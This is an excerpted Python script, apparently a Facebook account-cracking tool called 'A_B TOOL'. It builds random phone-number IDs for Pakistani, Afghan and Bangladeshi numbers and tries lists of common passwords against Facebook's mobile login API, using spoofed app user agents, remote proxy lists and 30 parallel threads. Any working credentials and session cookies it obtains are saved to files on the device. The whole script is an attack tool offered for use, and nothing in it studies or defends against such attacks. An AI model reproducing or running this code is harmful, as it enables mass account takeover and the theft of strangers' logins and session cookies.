...
try:
    prox= requests.get('https://raw.githubusercontent.com/HAJIJOKERHackER/proxies/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('')
    #time.sleep(2)
    #os.system(f'xdg-open https://www.facebook.com/kanokwan.plengien')
proxies=open('proxies.txt','r').read().splitlines()
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/HAJIJOKERHackER/strings/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
#_________[ TRACKING USERS IP ]______>>
ip = requests.get("https://api.ipify.org").text
print('\033[0;97m[•] \033[0;92mA_B TOOL IS TRACKING YOUR IP ADDRESS')
time.sleep(2)
print("\033[0;97m[•] \x1b[1;92mTHIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
#_________[ UA ]______>>
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/HAJIJOKERHackER/jokerkhan/main/jokerkhan.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
💥----------------------------------------------💥
\033[1;33m :AUTHER   : 𝐇𝐀𝐉𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍 
\033[1;32m :Facebook : 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑 
\033[1;31m :FRIEND   :  𝐀-𝐉-𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍
\033[1;30m :VERSION  : 1.8
\033[1;94m🌟-----------------------------------------------🌟
\033[1;52m          𝐇𝐀𝐉𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍                𝐇𝐀𝐂𝐊𝐄𝐑
💥------------------------------------------------💥
\033[1;33m          𝐀-𝐉-𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍                𝐇𝐀𝐂𝐊𝐄𝐑
⭐------------------------------------------------⭐'"""
...
CorrectUsername = 'SHAHI JOKER'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN A_B TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print('\t\x1b[1;92m        A_B TOOL METHODS MENU')
                                linex()
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     A_B TOOL PASSWORD MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m  A_B TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\t\x1b[1;92m   A_B TOOL FILE CRACKING MENU')
                                        linex()
                                        ...
                                        print('\033[0;97m[•]\x1b[1;92m A_B TOOL CRACKING HAS BEEN STARTED')
                                        linex()
                                ...
                                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/A_B-COOKIE.txt') 
                                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/A_B-OK.txt')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   A_B TOOL RANDOM CLONING MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM A_B TOOL')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/mradi5000');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE A_B TOOL');time.sleep(2);linex();exit() 
                        else:
                                print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');menu()
        except ValueError:
                exit()
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  A_B TOOL PAK RANDOM CLONER MENU')
                linex()
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as A_B:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   A_B TOOL RANDOM PAK CRACKING MENU')
                        linex()
                        ...
                        for psx in user:
                                ...
                                A_B.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/A_B-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/A_B-rndm-OK.txt')
                linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  A_B TOOL AFG RANDOM CLONER MENU')
                linex()
                print('\t\x1b[1;92m       AFG SIM CODE MENU')
                linex()
                print('\033[1;32m AFG SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m9377,9370,9379,.....etc')
                linex() 
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m ')
                linex() 
                try:
                ...
                with tred(max_workers=30) as A_B:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   A_B TOOL RANDOM AFG CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','600700','123456','afghan','afghan12345','afghan123','afghan1234','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
                                A_B.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mA_B TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as A_B:     
                        clear()
                        tl = str(len(user))
                        print('      \x1b[1;92mA_B TOOL RANDOM BANGLADESH CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mA_B-M1\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+str(random.randint(000000000,999999999))+';FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/'+fbcr+';FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'       
                        ...
                        A_B=session.cookies.get_dict().keys()
                        if "c_user" in A_B:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m[\033[0;97mA_B-OK\033[0;92m] \033[0;92m%s \033[0;97m| \033[0;92m%s'%(ids,pas))
                                open('/sdcard/A_B-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/A_B-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in A_B:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;92m[\033[0;91mA_B-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                        open('/sdcard/A_B-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mA_B-M2\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1406};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/arm64-v8a:;]'
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\33[1;92m[\033[0;97mA_B-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/A_B-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/A_B-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\33[1;97m[\033[1;92mA_B-2F\033[1;97m]\033[1;92m '+ids+' | '+pas)
                                                twf.append(ids)
                                                break                   
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mA_B-M3\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\r\x1b[1;92m[\033[0;97mA_B-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/A_B-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/A_B-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;96mA_B-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
                                                twf.append(ids)
                                                break           
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mA_B-CRACKING\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                                model = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
                                ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1406};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Etisalat;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+';FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    ...
                    'user-agent': ua}#'Mozilla/5.0 (Linux; Android 10; CPH2121 Build/RP1A.200720.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/358.0.0.34.117;]'}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/A_B-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                        print('\r\r\x1b[1;92m[\033[0;97mA_B-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                        #print("Cookie: "+coki)
                                                        open('/sdcard/A_B-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        open('/sdcard/A_B-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[1;92m[\033[0;91mA_B-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
                                                open('/sdcard/A_B-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                else:
                                        continue
